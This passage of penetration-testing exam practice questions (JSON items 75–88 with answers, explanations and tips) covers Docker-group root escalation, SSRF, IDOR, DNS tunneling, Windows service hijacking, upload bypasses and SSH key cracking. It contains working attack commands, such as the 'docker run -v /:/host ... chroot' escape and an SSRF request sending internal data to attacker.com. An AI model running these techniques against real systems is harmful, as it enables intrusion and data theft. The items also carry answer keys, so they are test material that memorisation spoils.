      "explanation": "The command output shows that the penetration tester's user (developer) is a member of the 'docker' group, which has access to the Docker socket (/var/run/docker.sock). This is a well-known privilege escalation vector, as Docker containers can be configured to mount the host filesystem. The command 'docker run -v /:/host -it ubuntu chroot /host /bin/bash' creates a new container that mounts the entire host filesystem (/) at /host within the container, then uses chroot to run a bash shell in the context of the host filesystem, effectively providing root access to the host system. The second option would only allow access to an existing container, not the host system. The third option attempts to create a user with UID 0 inside a container, which doesn't provide host access. The fourth option only creates a new Docker network, which doesn't provide any privilege escalation.",
      "examTip": "Membership in the Docker group is equivalent to having root access on a system, as it allows mounting the host filesystem inside a container. Always check group memberships during post-exploitation enumeration and understand the security implications of each group."
    },
    {
      "id": 76,
      "question": "A penetration tester finds a security issue in a web application's cookie handling. Upon inspecting the cookies set by the application, they observe:\n\n```\nSet-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; Path=/; HttpOnly\nSet-Cookie: remember=dXNlcm5hbWU9YWRtaW47c2VjcmV0PWFkbWluMTIzNDU=; Path=/; Expires=Thu, 19 Oct 2023 12:00:00 GMT\nSet-Cookie: preferences=theme=dark&notifications=on; Path=/\n```\n\nWhat security vulnerability is present in this cookie implementation?",
      "options": [
        "The remember cookie contains base64-encoded credentials without proper protection",
        "None of the cookies have the Secure flag set, allowing interception over HTTP",
        "The session cookie is missing the SameSite attribute, enabling CSRF attacks",
        "The preferences cookie uses insufficient encoding, allowing injection attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The remember cookie contains a Base64-encoded value which, when decoded, reveals plaintext credentials: 'username=admin;secret=admin12345' (dXNlcm5hbWU9YWRtaW47c2VjcmV0PWFkbWluMTIzNDU=). Storing credentials directly in cookies, even if encoded (not encrypted), is a serious security vulnerability as Base64 encoding provides no security - it's trivially reversible. While the missing Secure flag is a valid security concern, it's less severe than exposing actual credentials. The session cookie using JWT format without a SameSite attribute could enable CSRF, but this is also less critical than directly exposing credentials. The preferences cookie doesn't appear to have any injection vulnerability from the provided information - it's using standard key=value format for user preferences which typically wouldn't contain sensitive data.",
      "examTip": "Always decode suspicious-looking cookie values during penetration tests. Base64 encoding is often mistakenly used by developers who believe it adds security, when in fact it's trivially reversible and should never be used to store sensitive information like credentials."
    },
    {
      "id": 77,
      "question": "A penetration tester is analyzing the configuration of a WordPress website and finds the following security-related settings in the wp-config.php file:\n\n```php\n// ** Authentication Unique Keys and Salts. ** //\ndefine('AUTH_KEY',         'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('SECURE_AUTH_KEY',  'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('LOGGED_IN_KEY',    'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('NONCE_KEY',        'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('AUTH_SALT',        'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('SECURE_AUTH_SALT', 'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('LOGGED_IN_SALT',   'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\ndefine('NONCE_SALT',       'Bn:}9uu$HTk5.4n@A]/8o)7la}W77/`|i8XC-Vx~0:Wj+YWzq-G]5-|aK?9e%<c&');\n\n// ** Database settings ** //\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wp_user');\ndefine('DB_PASSWORD', 'P@ssw0rd123!');\ndefine('DB_HOST', 'localhost');\n\n// ** Security settings ** //\ndefine('FORCE_SSL_ADMIN', false);\ndefine('WP_DEBUG', true);\ndefine('WP_DEBUG_DISPLAY', true);\ndefine('WP_DEBUG_LOG', true);\n```\n\nWhat is the most significant security vulnerability in this configuration?",
      "options": [
        "All security keys and salts use identical values, weakening cookie security",
        "Debug mode is enabled, potentially exposing sensitive error information",
        "Admin SSL enforcement is disabled, allowing credentials to be sent unencrypted",
        "Database credentials are stored in plaintext in the configuration file"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most significant security issue is that all eight security keys and salts (AUTH_KEY, SECURE_AUTH_KEY, LOGGED_IN_KEY, NONCE_KEY, AUTH_SALT, SECURE_AUTH_SALT, LOGGED_IN_SALT, NONCE_SALT) have identical values. WordPress uses these keys and salts to securely hash passwords, generate security tokens, and create secure cookies. Using identical values for all of them significantly weakens the security of WordPress authentication cookies and makes them more vulnerable to forgery. Debug mode being enabled is a security concern as it could leak sensitive information, but this is typically less severe than authentication weaknesses. Disabled SSL for admin areas allows credential interception in transit, which is serious but requires an attacker to be in a position to intercept traffic. Database credentials in plaintext in config files is standard practice for many applications (though not ideal), as the security of the config file itself is the primary protection.",
      "examTip": "When testing WordPress security, check the uniqueness of security keys and salts in wp-config.php. These values should be unique, random, and long to properly secure authentication cookies and password hashing. Identical or predictable values significantly weaken WordPress security."
    },
    {
      "id": 78,
      "question": "During a penetration test, a tester is analyzing a GitHub repository and finds the following in a file named `deploy.yml`:\n\n```yaml\nname: Deploy to Production\n\non:\n  push:\n    branches: [ main ]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      \n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v1\n        with:\n          aws-access-key-id: AKIAIOSFODNN7EXAMPLE\n          aws-secret-access-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n          aws-region: us-west-2\n          \n      - name: Deploy to S3\n        run: |\n          aws s3 sync ./dist s3://example-production-website --delete\n```\n\nWhat security issue does this code reveal?",
      "options": [
        "AWS credentials are hardcoded in plaintext in the GitHub workflow file",
        "The GitHub action is using an outdated checkout version with vulnerabilities",
        "The S3 bucket permissions allow public write access through sync command",
        "The deployment occurs automatically on any push to the main branch without approval"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The GitHub workflow file contains hardcoded AWS credentials (aws-access-key-id: AKIAIOSFODNN7EXAMPLE and aws-secret-access-key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). This is a severe security issue as these credentials grant access to the AWS account and could be used by anyone who has access to the repository. GitHub workflow files are typically stored in the repository directly, making these credentials visible to anyone with repository access. While using actions/checkout@v2 isn't the latest version, it's not inherently a significant security vulnerability. There's no evidence from the workflow file that the S3 bucket has misconfigured permissions; the sync command itself doesn't indicate public write access. Automatic deployment on pushes to main is a common CI/CD practice and not inherently a security issue, though it could be improved with additional approval processes.",
      "examTip": "Always check CI/CD configuration files for hardcoded credentials during penetration tests. GitHub Actions workflow files (.github/workflows/*.yml) often contain sensitive credentials that should be stored as encrypted secrets instead of in plaintext."
    },
    {
      "id": 79,
      "question": "A penetration tester is assessing an API and intercepts the following request and response:\n\nRequest:\n```\nGET /api/v1/user/profile/123 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWQiOjEyMywidXNlcm5hbWUiOiJ0ZXN0dXNlciIsImlhdCI6MTUxNjIzOTAyMn0.QsODiLz9x7UD1YxjFtPKvsQHJxws1Y-QRFJbHMfCW2s\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 123,\n  \"username\": \"testuser\",\n  \"email\": \"test@example.com\",\n  \"role\": \"user\",\n  \"created_at\": \"2023-01-15T08:12:53Z\"\n}\n```\n\nThe tester modifies the request to:\n\n```\nGET /api/v1/user/profile/456 HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWQiOjEyMywidXNlcm5hbWUiOiJ0ZXN0dXNlciIsImlhdCI6MTUxNjIzOTAyMn0.QsODiLz9x7UD1YxjFtPKvsQHJxws1Y-QRFJbHMfCW2s\n```\n\nAnd receives:\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 456,\n  \"username\": \"adminuser\",\n  \"email\": \"admin@example.com\",\n  \"role\": \"admin\",\n  \"created_at\": \"2022-11-05T14:22:36Z\"\n}\n```\n\nWhat vulnerability has the tester identified?",
      "options": [
        "Broken Object Level Authorization (BOLA)",
        "JWT token tampering vulnerability",
        "Privilege escalation via role manipulation",
        "API endpoint security misconfiguration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester has identified a Broken Object Level Authorization (BOLA) vulnerability, also known as Insecure Direct Object Reference (IDOR). The API allows the user to access profile information for user ID 456 (an admin user) by simply changing the ID in the URL path, despite the JWT token containing an ID claim of 123. This indicates the API isn't properly validating that the authenticated user has permission to access the requested resource. BOLA/IDOR is consistently ranked as the most common and serious API security vulnerability. This is not JWT token tampering because the tester didn't modify the token, only the resource ID in the URL. There's no actual privilege escalation happening - the tester isn't gaining admin privileges, just viewing admin user data. While this is technically an API security misconfiguration, the specific vulnerability has a more precise name (BOLA) that better describes the issue.",
      "examTip": "When testing APIs, always try accessing resources belonging to other users by changing identifiers in the request path or parameters while keeping the same authentication token. Many APIs fail to verify that the authenticated user has permission to access the requested resource, leading to Broken Object Level Authorization vulnerabilities."
    },
    {
      "id": 80,
      "question": "A penetration tester is evaluating an internal web application. Using Burp Suite, they intercept a form submission and notice the following request:\n\n```\nPOST /process HTTP/1.1\nHost: intranet.example.com\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=2AD8934BC016417F\n\naction=generate_report&format=pdf&data=sensitive_financial_data&endpoint=http://localhost:8080/api/report\n```\n\nAfter modifying the request to:\n\n```\nPOST /process HTTP/1.1\nHost: intranet.example.com\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=2AD8934BC016417F\n\naction=generate_report&format=pdf&data=sensitive_financial_data&endpoint=http://attacker.com/capture\n```\n\nThe tester receives an HTTP request to their external server containing internal API data. What vulnerability has been identified?",
      "options": [
        "Server-Side Request Forgery (SSRF)",
        "Cross-Site Request Forgery (CSRF)",
        "XML External Entity (XXE) Injection",
        "Open Redirect vulnerability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester has identified a Server-Side Request Forgery (SSRF) vulnerability. The application allows the 'endpoint' parameter to be modified to point to an external server controlled by the attacker (attacker.com), causing the server to make a request to that external endpoint. This is a classic SSRF vulnerability where the server can be tricked into making requests to arbitrary destinations, potentially exposing internal services or data. Cross-Site Request Forgery (CSRF) involves tricking a user's browser into making unwanted requests, not the server itself making requests to attacker-controlled endpoints. XML External Entity (XXE) Injection involves parsing XML with external entity references, which isn't evident in this scenario. An Open Redirect vulnerability would involve the server redirecting the user's browser to an attacker-controlled site, but in this case, the server itself is making the request, not redirecting the user.",
      "examTip": "When testing for SSRF, look for parameters that could influence server-side HTTP requests, such as 'url', 'endpoint', 'callback', 'webhook', or similar parameters. Modifying these to point to your controlled server can reveal if the application makes server-side requests to arbitrary destinations."
    },
    {
      "id": 81,
      "question": "A penetration tester is assessing an organization's email security and attempts to send an email to an employee with the following headers:\n\n```\nFrom: ceo@company-domain.com\nTo: finance@company-domain.com\nSubject: Urgent Wire Transfer\nReply-To: attacker@evil-domain.com\n\nPlease process the attached wire transfer request immediately.\n```\n\nThe tester examines the received email and finds these authentication headers:\n\n```\nAuthentication-Results: company-domain.com;\n  dkim=none;\n  spf=fail (company-domain.com: 209.85.167.100 is not permitted) smtp.mailfrom=ceo@company-domain.com;\n  dmarc=fail (p=reject) header.from=company-domain.com\nReceived-SPF: fail (company-domain.com: 209.85.167.100 is not permitted) client-ip=209.85.167.100; envelope-from=ceo@company-domain.com; helo=mail-server.attacker.com;\n```\n\nDespite these failures, the email was delivered to the inbox. What security issue has been identified?",
      "options": [
        "Email filtering policy failure allowing spoofed emails despite DMARC/SPF failures",
        "Misconfigured DKIM implementation allowing unsigned emails to bypass authentication",
        "Compromised email account credentials enabling legitimate authenticated sending",
        "SMTP server vulnerability permitting header injection in mail transfer"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The authentication headers show that the email failed both SPF (Sender Policy Framework) and DMARC (Domain-based Message Authentication, Reporting, and Conformance) checks. The SPF header indicates the sending IP address (209.85.167.100) is not authorized to send email for company-domain.com. The DMARC header shows a failure with a policy of 'p=reject', indicating that emails failing DMARC should be rejected. Despite these authentication failures, the email was still delivered to the inbox, indicating a critical email filtering policy failure. This allows an attacker to send spoofed emails appearing to come from company executives. There's no indication of DKIM (DomainKeys Identified Mail) misconfiguration beyond it being absent ('dkim=none'). There's no evidence of compromised credentials; in fact, the authentication failures indicate the email was not sent through legitimate authenticated channels. There's no indication of SMTP header injection; the issue is with the email filtering policies after receiving the email with spoofed headers.",
      "examTip": "When testing email security, verify that messages failing authentication (SPF, DKIM, DMARC) are properly quarantined or rejected, especially for high-value domains like the organization's own domain. Many organizations configure authentication correctly but fail to enforce appropriate actions on authentication failures."
    },
    {
      "id": 82,
      "question": "A penetration tester has gained access to a Linux server and is examining security controls. They run the following commands:\n\n```bash\n$ cat /etc/fstab\n# /etc/fstab: static file system information.\n/dev/sda1  /     ext4  defaults  0  1\n/dev/sda2  /home ext4  defaults  0  2\ntmpfs      /tmp  tmpfs defaults,nodev,nosuid  0  0\n\n$ mount | grep -E 'noexec|nosuid|nodev'\ntmpfs on /tmp type tmpfs (rw,nosuid,nodev)\nprocfs on /proc type proc (rw,nosuid,nodev,noexec)\n/dev/sda1 on / type ext4 (rw)\n/dev/sda2 on /home type ext4 (rw)\n\n$ ls -la /tmp\ntotal 20\ndrwxrwxrwt 5 root root 4096 Oct 24 10:15 .\ndrwxr-xr-x 23 root root 4096 Oct 20 14:32 ..\ndrwx------ 2 user user 4096 Oct 24 09:45 .X11-unix\ndrwx------ 3 user user 4096 Oct 24 09:45 systemd-private-1b69fbb-user-runtime\ndrwxrwxrwx 2 root root 4096 Oct 24 10:15 world-writable\n```\n\nWhat security weakness has the tester identified?",
      "options": [
        "The /tmp filesystem lacks the noexec mount option, allowing execution of code from temporary files",
        "The system's root partition is missing essential security mount flags",
        "The world-writable directory in /tmp has excessive permissions allowing anyone to modify its contents",
        "The /proc filesystem has improper mount options exposing sensitive system information"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The output shows that while the /tmp filesystem has the nosuid and nodev mount options (as shown in both /etc/fstab and the mount output), it's missing the critical noexec option. The noexec mount option prevents the execution of binaries on the mounted filesystem and is a standard security control for temporary directories to prevent attackers from placing and executing malicious code. This is particularly concerning given that /tmp is often world-writable by design. The root partition (/) typically doesn't require the same restrictive mount options as temporary directories since it contains system binaries that need to execute. The world-writable directory in /tmp having 777 permissions is concerning but expected in a /tmp directory which is inherently designed for temporary file storage. The /proc filesystem actually has appropriate mount options (nosuid,nodev,noexec) as shown in the mount output.",
      "examTip": "When assessing Linux system hardening, check filesystem mount options carefully, particularly for directories like /tmp, /var/tmp, and /dev/shm. These should typically have the 'noexec' option to prevent execution of code, alongside 'nosuid' and 'nodev'."
    },
    {
      "id": 83,
      "question": "A penetration tester is checking an HTTPS website's TLS configuration by running the following OpenSSL command:\n\n```\n$ openssl s_client -connect example.com:443 -tls1_2\n...\nSSL handshake has read 4529 bytes and written 444 bytes\n...\nNew, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384\nServer public key is 2048 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\n...\nSSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : ECDHE-RSA-AES256-GCM-SHA384\n    Session-ID: 5F3C3987C2C9A887503232E9D231FECA4330145B967A9327E5775C1FB3CF8ADB\n    Session-ID-ctx: \n    Master-Key: 8AF3ABA915D57ECACAD1C4203A75D39143BCEA3525C697B49AC526DB044316240C28E6DA74A74FD12D7AEE8677612E23\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    TLS session ticket lifetime hint: 300 (seconds)\n    TLS session ticket: \n    0000 - 16 fa 43 99 be 6a 63 f7-bd 06 51 d5 39 9d 4a 3e   ..C..jc...Q.9.J>\n    0010 - 61 c2 96 78 4b 69 2b 9a-04 49 89 0b 15 82 aa 77   a..xKi+..I.....w\n...\n```\n\nThe tester then checks the headers sent by the server:\n\n```\n$ curl -sI https://example.com | grep -i security\nStrict-Transport-Security: max-age=31536000\n```\n\nWhat security issue should the tester report about this configuration?",
      "options": [
        "Missing TLS session ticket rotation creating potential for replay attacks",
        "Absence of key pinning headers allowing potential SSL stripping attacks",
        "Insufficient HSTS configuration missing includeSubDomains and preload directives",
        "Weak TLS cipher suite selection enabling downgrade attacks"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The HTTP Strict Transport Security (HSTS) header is present but incomplete. It only includes 'max-age=31536000' (1 year) but is missing the 'includeSubDomains' and 'preload' directives. The 'includeSubDomains' directive is important because it extends the HSTS policy to all subdomains, preventing attackers from exploiting less-secure subdomains. The 'preload' directive allows the domain to be included in browser HSTS preload lists, providing protection even on first visits before receiving the HSTS header. Missing these directives reduces the effectiveness of HSTS protection. While TLS session tickets could potentially be a security concern if not properly rotated, there's no evidence in the output suggesting this is an issue - session tickets with a 300-second lifetime hint are shown. Public key pinning (HPKP) has been deprecated by major browsers due to operational risks and has been replaced by Certificate Transparency, so its absence is not a significant issue. The TLS configuration shows a strong cipher (ECDHE-RSA-AES256-GCM-SHA384) with TLS 1.2, which is secure against downgrade attacks.",
      "examTip": "When assessing HTTPS security headers, a complete HSTS implementation should include 'max-age' with a long expiration time (typically at least 6 months), 'includeSubDomains' to protect all subdomains, and 'preload' to enable browser preloading for first-visit protection."
    },
    {
      "id": 84,
      "question": "A penetration tester is examining a Windows system for potential privilege escalation vectors. They run the following PowerShell commands:\n\n```powershell\nPS C:\\> Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq \"LocalSystem\"} | Select-Object Name, PathName, StartMode | Format-List\n\nName     : VulnService\nPathName : C:\\Program Files\\Vulnerable App\\service.exe\nStartMode: Auto\n\nPS C:\\> icacls \"C:\\Program Files\\Vulnerable App\"\nC:\\Program Files\\Vulnerable App BUILTIN\\Users:(OI)(CI)(M)\n                                  NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n                                  BUILTIN\\Administrators:(I)(OI)(CI)(F)\n\nPS C:\\> Get-Service -Name VulnService | Select-Object -Property Status, StartType\n\nStatus   StartType\n------   ---------\nRunning  Automatic\n```\n\nWhat privilege escalation technique should the tester attempt?",
      "options": [
        "Replace the service executable with a malicious version to execute code as SYSTEM",
        "Modify service configuration to run a different executable with elevated privileges",
        "Exploit unquoted service path vulnerability in the service path",
        "Use DLL hijacking to inject malicious code into the service process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The output shows a service called 'VulnService' running as LocalSystem (highest privileges), with its executable located at 'C:\\Program Files\\Vulnerable App\\service.exe'. The key finding is from the 'icacls' command, which shows that the 'Vulnerable App' directory has Modify (M) permissions for BUILTIN\\Users, meaning any user can modify files in this directory, including replacing the service executable. Since regular users can modify the service executable and the service runs as SYSTEM, the tester could replace the executable with a malicious version that would run with SYSTEM privileges when the service starts or restarts. Modifying service configuration typically requires administrative privileges, which the tester presumably doesn't have yet. There's no unquoted service path vulnerability as the path doesn't contain spaces without quotes. DLL hijacking might be possible but would require additional information about which DLLs the service loads, making it less direct than simply replacing the executable when full directory write permissions are available.",
      "examTip": "When looking for Windows privilege escalation, always check the permissions on service executables and their parent directories. If you find a service running as SYSTEM with an executable that you can modify as a regular user, you have a direct path to privilege escalation."
    },
    {
      "id": 85,
      "question": "A penetration tester is assessing an internal network and captures DNS traffic with the following pattern:\n\n```\n17:05:23.123456 IP 192.168.1.100.50416 > 192.168.1.1.53: 12345+ A? a1b2c3d4.data.exfiltration.attacker.com. (54)\n17:05:24.234567 IP 192.168.1.100.50417 > 192.168.1.1.53: 12346+ A? e5f6g7h8.data.exfiltration.attacker.com. (54)\n17:05:25.345678 IP 192.168.1.100.50418 > 192.168.1.1.53: 12347+ A? i9j0k1l2.data.exfiltration.attacker.com. (54)\n```\n\nThe tester also captures a suspicious process on a compromised endpoint:\n\n```\nps -ef | grep python\nuser     12345  1234  0 17:05 pts/0    00:00:02 python3 /tmp/.hidden/exfil.py\n```\n\nWhat technique is likely being used by the attacker?",
      "options": [
        "DNS tunneling for data exfiltration using encoded subdomains",
        "DNS amplification for a distributed denial-of-service attack",
        "DNS cache poisoning to redirect users to malicious sites",
        "DNS zone transfer attempts to enumerate network information"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The captured traffic shows a clear pattern of DNS queries for subdomains that contain what appears to be encoded data (a1b2c3d4, e5f6g7h8, i9j0k1l2) sent to a suspicious domain named 'exfiltration.attacker.com'. This is consistent with DNS tunneling used for data exfiltration, where data is encoded in subdomain labels of DNS queries to bypass network controls. The presence of a Python script running from a hidden directory in /tmp further supports this conclusion, as attackers commonly use scripting languages to implement DNS tunneling. DNS amplification would involve sending queries that generate much larger responses, typically to spoofed source addresses, which isn't evident in this traffic. DNS cache poisoning would involve manipulating DNS server responses to redirect legitimate queries, not sending sequential encoded queries. DNS zone transfer attempts would use specific DNS record types (AXFR/IXFR) rather than A record queries with encoded subdomains.",
      "examTip": "DNS tunneling for data exfiltration is often characterized by high volumes of DNS queries with unusually long, encoded, or patterned subdomain names. Look for subdomains that contain hexadecimal, base64-encoded data, or other structured patterns that could represent encoded information."
    },
    {
      "id": 86,
      "question": "A penetration tester has accessed a Docker host and is examining the container environment. They run the following commands:\n\n```bash\n$ docker ps\nCONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                        NAMES\nabc123def456   webapp:latest        \"/docker-entrypoint.\"   2 hours ago   Up 2 hours   0.0.0.0:8080->8080/tcp                       webapp\n789ghi012jkl   mysql:5.7            \"docker-entrypoint.s\"   2 hours ago   Up 2 hours   3306/tcp, 33060/tcp                          webapp-db\n\n$ docker inspect abc123def456 | grep -A5 CapAdd\n        \"CapAdd\": [\n            \"SYS_ADMIN\"\n        ],\n        \"CapDrop\": null,\n\n$ ls -la /var/run/docker.sock\nsrw-rw---- 1 root docker 0 Oct 25 08:15 /var/run/docker.sock\n\n$ id\nuid=1000(developer) gid=1000(developer) groups=1000(developer),998(docker)\n```\n\nWhich vulnerability is present in this Docker environment?",
      "options": [
        "The webapp container has excessive capabilities allowing potential container escape",
        "Misconfigured ownership of the Docker socket enabling privileged container creation",
        "Exposed database port creating a potential for data breach",
        "Outdated MySQL version with known remote code execution vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The 'docker inspect' output shows that the webapp container has been granted the SYS_ADMIN capability, which is one of the most powerful Linux capabilities and effectively gives the container near-root privileges on the host. This capability is particularly dangerous as it allows operations like mounting filesystems and can often be leveraged for container escape vulnerabilities. While the Docker socket is accessible to the user (via membership in the docker group), this is less of a vulnerability and more of a deliberate access grant. The MySQL container doesn't have its ports exposed to the host network (only the internal Docker network), as shown by the absence of a port mapping like '0.0.0.0:xxxx->3306/tcp'. The MySQL version (5.7) might have vulnerabilities, but there's insufficient information to determine if it's an unpatched instance with exploitable vulnerabilities, and it's not directly accessible from outside the Docker network.",
      "examTip": "The SYS_ADMIN capability is extremely powerful and should almost never be granted to containers in production environments. When assessing container security, always check for containers running with excessive capabilities, especially SYS_ADMIN, as these often provide a direct path to container escape."
    },
    {
      "id": 87,
      "question": "A penetration tester is assessing the security of a web application that processes file uploads. They intercept a file upload request with Burp Suite and notice the following request:\n\n```\nPOST /upload HTTP/1.1\nHost: vulnerable-webapp.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123\nCookie: session=eyJ1c2VyIjoiZ3Vlc3QifQ==\n\n------WebKitFormBoundaryABC123\nContent-Disposition: form-data; name=\"file\"; filename=\"document.pdf\"\nContent-Type: application/pdf\n\n%PDF-1.5\n... [binary PDF data] ...\n------WebKitFormBoundaryABC123--\n```\n\nAfter the upload completes, they receive the following response:\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"message\": \"File uploaded successfully\",\n  \"location\": \"/uploads/document_65f321a8.pdf\"\n}\n```\n\nWhich technique should the tester try next to test for file upload vulnerabilities?",
      "options": [
        "Change the Content-Type header to 'application/x-php' while maintaining the PDF content and .pdf extension",
        "Modify the file contents to include PHP code within valid PDF structure",
        "Change the filename to 'document.pdf.php' to attempt a double extension attack",
        "Inject XML entities into the PDF metadata to perform XXE attacks"
      ],
      "correctAnswerIndex": 2,
      "explanation": "The server's response suggests it generates a new filename with a random suffix ('document_65f321a8.pdf') but appears to preserve the original file extension. This indicates that a double extension attack might be successful, where the filename 'document.pdf.php' could potentially be processed as a PHP file if the server only validates the first extension or checks MIME types but doesn't properly validate the final extension. If the application uses the Content-Type header from the request for validation but doesn't verify the actual file contents, changing the Content-Type might bypass some checks, but the server would likely still save the file with a .pdf extension. Embedding PHP code in a valid PDF structure would be ineffective unless the server actually processes PDFs with a PHP interpreter, which is highly unusual. XML entity injection into PDF metadata would test for XXE vulnerabilities in PDF processing, but there's no indication that the server processes the PDF content in a way that would interpret XML entities.",
      "examTip": "When testing file upload functionality, double extension attacks (like file.jpg.php) are effective against applications that validate the first extension or MIME type but fail to check if there are multiple extensions, where the last extension determines how the server processes the file."
    },
    {
      "id": 88,
      "question": "A penetration tester finds an SSH private key on a compromised web server while exploring the home directory of a user:\n\n```bash\n$ cat ~/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C\n\n1jN+RVzjlmA6rcsPGHrztTJI/xh3HOkRC1QYbS+SrYoK8ZPWmLUB87x1jaMnCEWm\nQxFyQDUe3PhiGG3aiWGyX1UgQClxsxkVFJR+IHetCXEpVFHyZ0xe7XV1gBsP9GgQ\nIE/BM6t5I95GS7CYUjgA/OBE9m7jn3gr/9pL3qdFXHdEEH6lZ3YxFUwbHvwHEJmk\nwvFYLCWuSYxGJWQfzXXLKopeNXE2wZQp3y9QjuLEtf+cD2PJLGzAFEOoVpFnFPjj\nXYUr5yJ0JZf3Omf+vU0JNrMJq/6+xtSLFKrobibELBFLbSnPJrB1DSbEAMSIP7BK\nLFL45VKvQZDfmqdLn9HF7/BahtoFpvIj5wNioN1+LdwSJEYVWSqXXcDGl6647Rwo\n6GcScn0nfbKS4+9kQQ4JT/Nx6hHyJEYvVa4LwQLHp7/QnRwYc5JKaw4CycmB78g+\nE54MR6V7iLnLZxBg4bHmi8l5HoEMC6wBhV0xOswSQuGGIFiY39vV9LVPx9pZ1woH\nwQAb7Ugdb/aHM7PyC6g0+0F7LGsHOLzKY9wiQYcUP6BqRPu8B1jYo/KYGBnJYmwl\nyKVvAwjnB5XVjZ83FjTLG+KFUOFj1ag87xeoJ18CcjgZ7Zt5gGiMjJNO3G/At/N9\nuIbXLBa/0lAoYNyax9BqLsYnKmVJFYgvs3OlFT3/jLiY5L+IsMkEIIZwSSYGf8dd\nKRmqrEuH8h3KRXuEWU6sOIphfLYtJ9+0iXUhkNPrA+JbkJ4MbNEuWwlEwkIQOB2+\nx7zJZyM8LPaeSQP5GqZGhJdYMfAr0ycKLra4KwUQ8LUj3vYnf0UCqvn7vM9O3QkS\n-----END RSA PRIVATE KEY-----\n\n$ ls -l ~/.ssh/id_rsa\n-rw------- 1 webuser webuser 1679 May 15 2023 /home/webuser/.ssh/id_rsa\n```\n\nWhat should the penetration tester attempt next with this discovery?",
      "options": [
        "Crack the passphrase protecting the SSH key using ssh2john and John the Ripper",
        "Search the filesystem for corresponding authorized_keys files to identify potential target servers",
        "Modify system SSH configuration to enable password-based authentication bypass",
        "Use the key directly for authentication since it has secure file permissions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The SSH private key is encrypted, as indicated by the 'Proc-Type: 4,ENCRYPTED' header and the DEK-Info line showing AES-128-CBC encryption. Before the key can be used for authentication, the tester would need to determine the passphrase protecting it. Using ssh2john to convert the key to a format suitable for password cracking, followed by John the Ripper to attempt to crack the passphrase, would be the most appropriate next step. Searching for authorized_keys files would be useful to identify target systems, but only after obtaining the passphrase to actually use the key. Modifying system SSH configuration would require root privileges, which the tester likely doesn't have if they're examining a regular user's home directory. The fact that the key has proper file permissions (600, readable and writable only by the owner) is good security practice, but doesn't help the tester use the key without the passphrase.",
      "examTip": "When discovering encrypted SSH private keys during penetration tests, use ssh2john to convert the key to a format suitable for John the Ripper, then attempt to crack the passphrase. Many users choose weak passphrases that can be easily cracked, providing lateral movement opportunities."
    },
    {
      "id": 89,
